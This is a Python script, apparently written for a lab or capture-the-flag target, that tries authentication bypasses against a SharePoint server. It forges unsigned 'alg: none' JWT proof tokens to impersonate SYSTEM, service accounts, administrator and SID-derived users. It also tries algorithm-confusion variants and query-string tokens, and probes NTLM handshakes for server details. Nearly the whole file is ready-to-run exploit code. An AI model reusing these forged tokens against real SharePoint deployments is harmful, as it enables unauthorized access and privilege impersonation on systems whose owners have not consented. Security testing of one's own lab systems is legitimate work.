# Purpose: Test additional authentication bypass techniques from historical research
# Outcome: Verify completeness of bypass testing

import base64
import json
import time
import requests

def b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

target_base = "http://10.10.10.166"
client_id = "00000003-0000-0ff1-ce00-000000000000"
realm = "5637f856-255d-4039-b165-224f3371d1d4"

print("[*] Testing additional auth bypass techniques from historical research...")

# Test 1: MySite endpoint with NT AUTHORITY\LOCAL SERVICE impersonation
print("\n[Test 1] MySite endpoint with different identities...")
now = int(time.time())
identities = [
    ("NT AUTHORITY\\LOCAL SERVICE", "urn:office:idp:activedirectory"),
    ("NT AUTHORITY\\SYSTEM", "urn:office:idp:activedirectory"),
    ("NT AUTHORITY\\NETWORK SERVICE", "urn:office:idp:activedirectory"),
    (f"{client_id}@{realm}", "urn:office:idp:activedirectory"),  # App identity
]

for nameid, nii in identities:
    payload = {
        "aud": f"{client_id}@{realm}",
        "iss": client_id,
        "nbf": now - 300,
        "exp": now + 3600,
        "ver": "hashedprooftoken",
        "nameid": nameid,
        "nii": nii,
        "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
        "endpointurlLength": 1,
        "isloopback": True,
        "isuser": True
    }
    header = {"alg": "none", "typ": "JWT"}
    jwt = f"{b64url_encode(json.dumps(header))}.{b64url_encode(json.dumps(payload))}."
    
    headers = {
        "Authorization": f"Bearer {jwt}",
        "X-PROOF_TOKEN": jwt,
        "Accept": "application/json"
    }
    
    # Test /my/ endpoint
    for ep in ["/my/_vti_bin/listdata.svc/UserInformationList", "/my/_api/web/currentuser"]:
        try:
            r = requests.get(f"{target_base}{ep}", headers=headers, timeout=10, allow_redirects=False)
            status = r.status_code
            if status != 401:
                print(f"    [INTERESTING] {nameid[:30]}... on {ep}: {status}")
            else:
                pass  # Skip 401s
        except Exception as e:
            pass

# Test 2: SID-based user enumeration
print("\n[Test 2] SID-based user enumeration...")
# Domain SID prefix (generic Windows format)
sid_prefixes = [
    "S-1-5-21-0-0-0",  # Generic
    "S-1-5-21-500-500-500",  # Another format
]

for sid_prefix in sid_prefixes[:1]:  # Just test one
    for rid in [500, 1000, 1001, 1100]:  # Administrator=500, common user RIDs
        nameid = f"c#.w|s-1-5-21-{rid}"
        payload = {
            "aud": f"{client_id}@{realm}",
            "iss": client_id,
            "nbf": now - 300,
            "exp": now + 3600,
            "ver": "hashedprooftoken",
            "nameid": nameid,
            "nii": "urn:office:idp:activedirectory",
            "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
            "endpointurlLength": 1,
            "isloopback": True,
            "isuser": True
        }
        header = {"alg": "none"}
        jwt = f"{b64url_encode(json.dumps(header))}.{b64url_encode(json.dumps(payload))}."
        headers = {
            "Authorization": f"Bearer {jwt}",
            "X-PROOF_TOKEN": jwt,
            "Accept": "application/json"
        }
        try:
            r = requests.get(f"{target_base}/_api/web/currentuser", headers=headers, timeout=10)
            if r.status_code == 200:
                print(f"    [SUCCESS] RID {rid}: {r.status_code}")
                break
        except:
            pass

# Test 3: Different JWT signing algorithm confusion
print("\n[Test 3] Algorithm confusion attacks...")
alg_attacks = [
    {"alg": "None"},
    {"alg": "NONE"},
    {"alg": "HS256"},  # Without signature, server might error differently
    {"alg": "RS256"},  # RSA without signature
    {"alg": "ES256"},  # ECDSA without signature
    {"alg": ""},       # Empty algorithm
]

base_payload = {
    "aud": f"{client_id}@{realm}",
    "iss": client_id,
    "nbf": now - 300,
    "exp": now + 3600,
    "ver": "hashedprooftoken",
    "nameid": "administrator",
    "nii": "urn:office:idp:activedirectory",
    "endpointurl": "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
    "endpointurlLength": 1,
    "isloopback": True,
    "isuser": True
}

for header in alg_attacks:
    jwt = f"{b64url_encode(json.dumps(header))}.{b64url_encode(json.dumps(base_payload))}.AAA"
    headers = {
        "Authorization": f"Bearer {jwt}",
        "X-PROOF_TOKEN": jwt,
        "Accept": "application/json"
    }
    try:
        r = requests.get(f"{target_base}/_api/web/currentuser", headers=headers, timeout=10)
        print(f"    alg='{header.get('alg')}': {r.status_code} - {r.text[:50]}")
    except Exception as e:
        print(f"    alg='{header.get('alg')}': Error - {str(e)[:30]}")

# Test 4: OAuth endpoints with token in query parameter (instead of header)
print("\n[Test 4] Token in query parameter (access_token)...")
endpoints = ["/_api/web/currentuser", "/_api/web/siteusers", "/_vti_bin/client.svc"]
for ep in endpoints[:2]:
    jwt = f"{b64url_encode(json.dumps({'alg': 'none'}))}.{b64url_encode(json.dumps(base_payload))}."
    try:
        r = requests.get(f"{target_base}{ep}?access_token={jwt}&prooftoken={jwt}", timeout=10)
        print(f"    {ep}: {r.status_code}")
    except Exception as e:
        print(f"    {ep}: Error - {str(e)[:30]}")

# Test 5: NTLM extraction (Type 2 message parsing)
print("\n[Test 5] NTLM extraction test...")
try:
    # Send NTLM Type 1 message
    ntlm_type1 = "TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAAAAAAAMAAAAAAA"  # Basic Type 1
    headers = {"Authorization": f"NTLM {ntlm_type1}"}
    r = requests.get(f"{target_base}/_api/web", headers=headers, timeout=10, allow_redirects=False)
    print(f"    NTLM Type 1 response: {r.status_code}")
    if 'WWW-Authenticate' in r.headers:
        www_auth = r.headers['WWW-Authenticate']
        print(f"    WWW-Authenticate: {www_auth[:100]}")
except Exception as e:
    print(f"    NTLM test error: {e}")

print("\n[*] Additional bypass testing complete")
